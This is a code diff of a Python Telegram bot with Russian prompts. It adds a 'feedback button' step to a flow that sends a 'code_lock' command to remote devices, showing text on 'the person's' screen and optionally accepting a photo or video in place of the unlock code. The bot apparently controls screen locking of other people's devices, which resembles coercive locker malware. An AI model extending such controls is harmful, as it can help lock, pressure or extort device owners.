@@ -291,6 +291,12 @@ def code_media_keyboard():
         {"text": "🚫 Только код",           "callback_data": "code_media_no"},
     ]]}
 
+def code_feedback_keyboard():
+    return {"inline_keyboard": [[
+        {"text": "💬 Да, добавить",  "callback_data": "code_feedback_yes"},
+        {"text": "🚫 Нет",           "callback_data": "code_feedback_no"},
+    ]]}
+
 def code_confirm_keyboard(dev_id: str, chat_id: str):
     return {"inline_keyboard": [[
         {"text": "✅ Разрешить",  "callback_data": f"code_approve|{dev_id}|{chat_id}"},
@@ -439,6 +445,16 @@ async def process_callback(callback: dict):
     csess = state["code_sessions"].get(chat_id)
     if csess and csess["step"] == "allow_media" and data in ("code_media_yes", "code_media_no"):
         csess["allow_media"] = (data == "code_media_yes")
+        csess["step"] = "allow_feedback"
+        await answer_callback(cb_id)
+        await send_tg(chat_id,
+            "💬 Добавить кнопку обратной связи?\n"
+            "_(Человек сможет выбрать VPN или открыть Telegram)_",
+            reply_markup=code_feedback_keyboard())
+        return
+
+    if csess and csess["step"] == "allow_feedback" and data in ("code_feedback_yes", "code_feedback_no"):
+        csess["allow_feedback"] = (data == "code_feedback_yes")
         await answer_callback(cb_id)
         state["code_sessions"].pop(chat_id, None)
 
@@ -447,10 +463,11 @@ async def process_callback(callback: dict):
             await send_tg(chat_id, err); return
 
         cmd = {
-            "cmd":         "code_lock",
-            "secret":      csess["secret"],
-            "text":        csess["text"],
-            "allow_media": csess["allow_media"],
+            "cmd":            "code_lock",
+            "secret":         csess["secret"],
+            "text":           csess["text"],
+            "allow_media":    csess["allow_media"],
+            "allow_feedback": csess["allow_feedback"],
         }
         await enqueue_multi(chat_id, cmd, "code_lock")
         return
@@ -872,10 +889,11 @@ async def process_update(update: dict):
             await send_tg(chat_id, "⚠️ Укажи код: /code 1234")
             return
         state["code_sessions"][chat_id] = {
-            "step":        "text",
-            "secret":      secret,
-            "text":        "",
-            "allow_media": False,
+            "step":           "text",
+            "secret":         secret,
+            "text":           "",
+            "allow_media":    False,
+            "allow_feedback": False,
         }
         await send_tg(chat_id, "✏️ Напиши текст который увидит человек на экране:")
 
@@ -884,8 +902,7 @@ async def process_update(update: dict):
         csess["text"] = text
         csess["step"] = "allow_media"
         await send_tg(chat_id,
-            f"📸 Разрешить отправку фото/видео как альтернативу коду?\n\n"
-            f"Если да — ты получишь файл в бот с кнопками ✅/❌ для подтверждения",
+            "📸 Разрешить отправку фото/видео как альтернативу коду?",
             reply_markup=code_media_keyboard())
 
     elif text in ("/video1", "/video2", "/video3"):
